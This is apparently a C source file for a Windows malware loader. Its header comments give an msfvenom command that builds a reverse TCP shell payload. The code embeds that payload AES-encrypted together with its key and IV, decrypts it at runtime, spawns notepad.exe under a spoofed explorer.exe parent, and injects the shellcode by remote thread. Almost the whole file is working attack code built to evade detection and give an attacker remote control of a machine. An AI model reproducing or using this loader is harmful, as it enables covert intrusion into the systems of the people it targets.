// msfvenom -p windows/x64/shell_reverse_tcp  LHOST=ip LPORT=port -f raw -o shell.bin 
// HellShell.exe shell.bin  aes
// https://github.com/alex14324/Hellshell Tool hellshell 
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <wincrypt.h> 
#include <TlHelp32.h>
#include <bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")

#pragma comment(lib, "advapi32.lib") 
#pragma warning (disable:4996)
#define NT_SUCCESS(status)              (((NTSTATUS)(status)) >= 0)
#define KEYSIZE         32
#define IVSIZE          16

typedef struct _AES {
    PBYTE   pPlainText;             // base address of the plain text data
    DWORD   dwPlainSize;            // size of the plain text data

    PBYTE   pCipherText;            // base address of the encrypted data
    DWORD   dwCipherSize;           // size of it (this can change from dwPlainSize in case there was padding)

    PBYTE   pKey;                   // the 32 byte key
    PBYTE   pIv;                    // the 16 byte iv
}AES, * PAES;

// the real decryption implemantation
BOOL InstallAesDecryption(PAES pAes) {

    BOOL                            bSTATE = TRUE;

    BCRYPT_ALG_HANDLE               hAlgorithm = NULL;
    BCRYPT_KEY_HANDLE               hKeyHandle = NULL;

    ULONG                           cbResult = NULL;
    DWORD                           dwBlockSize = NULL;

    DWORD                           cbKeyObject = NULL;
    PBYTE                           pbKeyObject = NULL;

    PBYTE                           pbPlainText = NULL;
    DWORD                           cbPlainText = NULL;

    NTSTATUS                        STATUS = NULL;

    // intializing "hAlgorithm" as AES algorithm Handle
    STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the key object variable *pbKeyObject* this is used for BCryptGenerateSymmetricKey function later
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&cbKeyObject, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // getting the size of the block used in the encryption, since this is aes it should be 16 (this is what AES does)
    STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGetProperty[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // checking if block size is 16
    if (dwBlockSize != 16) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating memory for the key object
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (pbKeyObject == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // setting Block Cipher Mode to CBC (32 byte key and 16 byte Iv)
    STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // generating the key object from the aes key "pAes->pKey", the output will be saved in "pbKeyObject" of size "cbKeyObject"
    STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pbKeyObject, cbKeyObject, (PBYTE)pAes->pKey, KEYSIZE, 0);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt first time with NULL output parameters, thats to deduce the size of the output buffer, (the size will be saved in cbPlainText)
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, NULL, 0, &cbPlainText, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[1] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // allocating enough memory (of size cbPlainText)
    pbPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbPlainText);
    if (pbPlainText == NULL) {
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // running BCryptDecrypt second time with "pbPlainText" as output buffer
    STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pAes->pCipherText, (ULONG)pAes->dwCipherSize, NULL, pAes->pIv, IVSIZE, pbPlainText, cbPlainText, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(STATUS)) {
        printf("[!] BCryptDecrypt[2] Failed With Error: 0x%0.8X \n", STATUS);
        bSTATE = FALSE; goto _EndOfFunc;
    }
    // cleaning up
_EndOfFunc:
    if (hKeyHandle) {
        BCryptDestroyKey(hKeyHandle);
    }
    if (hAlgorithm) {
        BCryptCloseAlgorithmProvider(hAlgorithm, 0);
    }
    if (pbKeyObject) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
    }
    if (pbPlainText != NULL && bSTATE) {
        // if everything went well, we save pbPlainText and cbPlainText
        pAes->pPlainText = pbPlainText;
        pAes->dwPlainSize = cbPlainText;
    }
    return bSTATE;
}


// wrapper function for InstallAesDecryption that make things easier
BOOL SimpleDecryption(IN PVOID pCipherTextData, IN DWORD sCipherTextSize, IN PBYTE pKey, IN PBYTE pIv, OUT PVOID* pPlainTextData, OUT DWORD* sPlainTextSize) {
    if (pCipherTextData == NULL || sCipherTextSize == NULL || pKey == NULL || pIv == NULL)
        return FALSE;

    AES Aes;// = {
    Aes.pKey = pKey;   //  .pKey = pKey,
    Aes.pIv  = pIv;    //  .pIv = pIv,
    Aes.pCipherText = (PBYTE)pCipherTextData;//    .pCipherText = pCipherTextData,
    Aes.dwCipherSize = sCipherTextSize;     // .dwCipherSize = sCipherTextSize
  //  };

    if (!InstallAesDecryption(&Aes)) {
        return FALSE;
    }

    *pPlainTextData = Aes.pPlainText;
    *sPlainTextSize = Aes.dwPlainSize;

    return TRUE;
}

unsigned char AesCipherText[] = {
        0xBC, 0x7F, 0x63, 0xFD, 0x12, 0x61, 0x39, 0x37, 0xE9, 0x02, 0x0B, 0x9E, 0x13, 0xCF, 0x5E, 0x08,
        0xAA, 0xEE, 0xD3, 0x3A, 0xD7, 0x1F, 0x10, 0x8B, 0x6A, 0x89, 0x14, 0x29, 0xCC, 0x8A, 0xA2, 0xE9,
        0xF8, 0xFA, 0xFD, 0x7B, 0x44, 0x41, 0xC1, 0x67, 0x62, 0xB9, 0x1A, 0xCA, 0x36, 0xD6, 0x6D, 0xB7,
        0x4F, 0x21, 0xB4, 0x39, 0xEB, 0xF9, 0x8A, 0xC7, 0xA2, 0x86, 0x2E, 0x35, 0xD9, 0x9A, 0xCB, 0x2A,
        0x83, 0x11, 0x54, 0xA6, 0x50, 0xF1, 0xCA, 0x94, 0x7E, 0x2E, 0x87, 0x10, 0xE5, 0x73, 0x4E, 0xFE,
        0xFF, 0x22, 0x61, 0x69, 0xCB, 0x1F, 0x68, 0xD4, 0xBE, 0x9D, 0xEC, 0xDD, 0x12, 0x30, 0x5B, 0xE4,
        0x49, 0x04, 0xC7, 0x44, 0xC6, 0xD6, 0xB3, 0x68, 0x2A, 0xDC, 0x9F, 0x3D, 0x67, 0x0B, 0xCB, 0xD3,
        0xEF, 0x94, 0x74, 0x50, 0x5F, 0xAB, 0x0D, 0xEF, 0x35, 0x1C, 0x87, 0x7F, 0x67, 0x67, 0x87, 0xE3,
        0x86, 0xAC, 0x73, 0x8E, 0xE9, 0x8E, 0x07, 0xB6, 0x21, 0xA0, 0xBC, 0x82, 0x2D, 0x58, 0x16, 0x5B,
        0x79, 0xF8, 0xBF, 0x40, 0xE8, 0x11, 0xBF, 0xEC, 0xE1, 0x1B, 0x6F, 0x56, 0x7F, 0x5E, 0xB1, 0x14,
        0xF3, 0xD5, 0x75, 0xA7, 0x1E, 0x14, 0x22, 0xBC, 0x12, 0x60, 0x6E, 0x14, 0xA2, 0x39, 0x6A, 0xB9,
        0xCD, 0x58, 0x67, 0x01, 0x36, 0x1D, 0x32, 0x93, 0x8F, 0x26, 0xBB, 0xF0, 0x5D, 0xF1, 0x6C, 0x8A,
        0x8C, 0xEC, 0xC8, 0x2E, 0x38, 0x71, 0x96, 0x66, 0x19, 0x03, 0xE5, 0xEB, 0x16, 0x07, 0x56, 0x24,
        0x19, 0xA3, 0x55, 0x0B, 0x7F, 0x07, 0xFC, 0xCE, 0x33, 0xA0, 0x62, 0x75, 0x73, 0x72, 0xBB, 0xC4,
        0xC5, 0x73, 0x44, 0x81, 0x2F, 0x31, 0xAA, 0x5B, 0x6D, 0xFD, 0x8E, 0x83, 0xDA, 0xA9, 0xC5, 0x5A,
        0x7C, 0x8F, 0x90, 0x70, 0x1A, 0xAC, 0x07, 0x27, 0xD4, 0x10, 0x9C, 0x70, 0x2C, 0x57, 0xEB, 0x9D,
        0xAC, 0xB6, 0x52, 0x37, 0x41, 0xFD, 0x9E, 0x43, 0x01, 0xA8, 0x03, 0xCC, 0x0E, 0x2A, 0xDE, 0x6B,
        0x3D, 0x09, 0xC0, 0x71, 0x16, 0xE3, 0x03, 0x95, 0xD1, 0x1B, 0xCF, 0xDC, 0xAB, 0x0B, 0x3E, 0xFD,
        0x73, 0x93, 0xAD, 0xC8, 0x1F, 0xCF, 0xB7, 0x8A, 0xA9, 0x44, 0xF9, 0xA2, 0xA4, 0xA3, 0xE0, 0x47,
        0xCB, 0x03, 0xF6, 0x10, 0x41, 0x7D, 0x5C, 0xBC, 0x7F, 0x81, 0x22, 0x30, 0x9A, 0xB8, 0x50, 0x6A,
        0xC5, 0xEE, 0xB8, 0x5C, 0x42, 0xD3, 0x4B, 0xF8, 0x6B, 0xD7, 0x85, 0xAB, 0x77, 0x38, 0xB9, 0xBB,
        0x7E, 0xFB, 0xC4, 0x67, 0xE9, 0x1B, 0x30, 0x44, 0x9A, 0x4C, 0x95, 0xD6, 0x88, 0xD1, 0x60, 0xB7,
        0x5A, 0x1E, 0x2E, 0xDA, 0xC6, 0xFD, 0x1C, 0xF7, 0xA3, 0xC0, 0x9C, 0x14, 0x76, 0x55, 0x74, 0xED,
        0xC8, 0x66, 0xBB, 0xF2, 0x38, 0x3E, 0xEC, 0x56, 0x33, 0xB0, 0x1C, 0xE6, 0x2F, 0xBA, 0x97, 0x4E,
        0xB6, 0x5D, 0xBA, 0x7A, 0xFD, 0x12, 0x7C, 0x16, 0x37, 0xCF, 0x63, 0xEC, 0xAA, 0x27, 0x2F, 0x23,
        0xD2, 0xD2, 0x77, 0xD2, 0x7D, 0x23, 0x4E, 0x4D, 0xD5, 0x08, 0x4C, 0xF4, 0x77, 0xE7, 0xA8, 0x9D,
        0x98, 0x22, 0x18, 0xFB, 0x1F, 0xFA, 0x38, 0xCF, 0x01, 0x63, 0x06, 0x1F, 0xEA, 0x5D, 0x52, 0xCA,
        0x24, 0x0A, 0x9A, 0x90, 0xBF, 0x49, 0x97, 0xAA, 0x9C, 0x13, 0x69, 0xED, 0x23, 0x9A, 0x57, 0xE5,
        0x9F, 0x37, 0x67, 0xD3, 0x85, 0x7C, 0xFB, 0x6E, 0xBC, 0x5F, 0x82, 0x7C, 0x87, 0x49, 0xC1, 0x99 };


unsigned char AesKey[] = {
        0x63, 0x4A, 0xC0, 0x4A, 0x97, 0xE2, 0xA2, 0xF0, 0x0B, 0x98, 0x84, 0x7B, 0x12, 0xC8, 0x63, 0xC9,
        0xA6, 0xD1, 0x37, 0xC1, 0xA2, 0x75, 0xC9, 0xD9, 0x32, 0x7E, 0xC5, 0xDB, 0x87, 0xA7, 0x10, 0xEA };


unsigned char AesIv[] = {
        0x04, 0xB2, 0x13, 0x5E, 0x24, 0x0E, 0x0D, 0x8B, 0x97, 0x0E, 0x45, 0x7E, 0x27, 0x65, 0x6E, 0xB4 };


BOOL injection(HANDLE hProcess, PBYTE shellcode, SIZE_T shellcodeSize) {
    PVOID remoteMemory;
    DWORD oldProtect;


    remoteMemory = VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteMemory == NULL) {
        printf("VirtualAllocEx failed: %lu\n", GetLastError());
        return FALSE;
    }


    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodeSize, NULL)) {
        printf("WriteProcessMemory failed: %lu\n", GetLastError());
        return FALSE;
    }


    if (!VirtualProtectEx(hProcess, remoteMemory, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("VirtualProtectEx failed: %lu\n", GetLastError());
        return FALSE;
    }


    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed: %lu\n", GetLastError());
        return FALSE;
    }


    CloseHandle(hThread);
    return TRUE;
}
BOOL search_process(LPCWSTR  procees_name, HANDLE* hprocess_out, DWORD* process_id_out) {

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    HANDLE hsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hsnapshot == INVALID_HANDLE_VALUE) {
        printf("failed to take snapshot ");
        return FALSE;
    }
    if (!Process32First(hsnapshot, &pe)) {

        printf("failed to get first process Error %lu", GetLastError());
        return FALSE;
    }
    do
    {
        if (_wcsicmp(pe.szExeFile, procees_name) == 0) {
            printf("found process  %lu (PID %lu \n ", pe.szExeFile, pe.th32ProcessID);

            HANDLE hprocess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            if (hprocess == NULL)
            {
                printf("failed to open process Error %li \n", GetLastError());
                return FALSE;
            }

            *hprocess_out = hprocess;
            *process_id_out = pe.th32ProcessID;

            CloseHandle(hsnapshot);
            return TRUE;

        }




    } while (Process32NextW(hsnapshot, &pe));

    printf("process not found %lu \n ", procees_name);
    CloseHandle(hsnapshot);
    return TRUE;
}



BOOL ppid(HANDLE hparentprocess, LPCSTR process_name, HANDLE* hthread, HANDLE* hprocess, DWORD* pid) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;
    LPPROC_THREAD_ATTRIBUTE_LIST attrList;
    CHAR lpPath[MAX_PATH * 2];
    CHAR currentdir[MAX_PATH];
    CHAR wnDr[MAX_PATH];

    if (!GetEnvironmentVariableA("WINDIR", wnDr, MAX_PATH)) {
        printf("GetEnvironmentVariableA failed\n");
        return FALSE;
    }

    sprintf(lpPath, "%s\\System32\\%s", wnDr, process_name);// lpPath = "C:\\Windows\\System32\\cmd.exe"
    sprintf(currentdir, "%s\\System32", wnDr);//currentdir = "C:\\Windows\\System32\\"

    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    attrList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(
        GetProcessHeap(), 0, size);

    if (!InitializeProcThreadAttributeList(attrList, 1, NULL, &size)) {
        printf("[!] InitializeProcThreadAttributeList Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!UpdateProcThreadAttribute(attrList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hparentprocess, sizeof(HANDLE), NULL, NULL)) {
        printf("[!] UpdateProcThreadAttribute Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }
    si.lpAttributeList = attrList;
    if (!CreateProcessA(
        NULL,
        lpPath,
        NULL, NULL, FALSE,
        EXTENDED_STARTUPINFO_PRESENT,
        NULL,
        currentdir,
        &si.StartupInfo,
        &pi
    ))
    {

        printf("[!] CreateProcessA Failed With Error: %lu\n", GetLastError());
        return FALSE;
    }

    *hthread = pi.hThread;
    *hprocess = pi.hProcess;
    *pid = pi.dwProcessId;

    DeleteProcThreadAttributeList(attrList);
    CloseHandle(hparentprocess);

    if (*hthread != NULL && *hprocess != NULL && *pid != NULL)
        return TRUE;



    return  FALSE;
}


 
int main() {
    LPCWSTR parentprocess = L"explorer.exe";
    LPCSTR process_name = "notepad.exe";
    DWORD dwppdi = NULL;
    DWORD pid = NULL;
    HANDLE hthread = NULL;
    HANDLE hprocess = NULL;
    HANDLE hparentprocess = NULL;
    PVOID DecryptedShellcode = NULL;
    DWORD DecryptedShellcodeSize = 0;
    if (search_process(parentprocess, &hparentprocess, &dwppdi))
    {
        if (ppid(hparentprocess, process_name, &hthread, &hprocess, &pid))
        {
            if (SimpleDecryption(
                AesCipherText,
                sizeof(AesCipherText),
                AesKey,
                AesIv,
                &DecryptedShellcode,
                &DecryptedShellcodeSize))
            {
                injection(hprocess, (PBYTE)DecryptedShellcode, DecryptedShellcodeSize);
            }
        }
    }

    return 0;
}
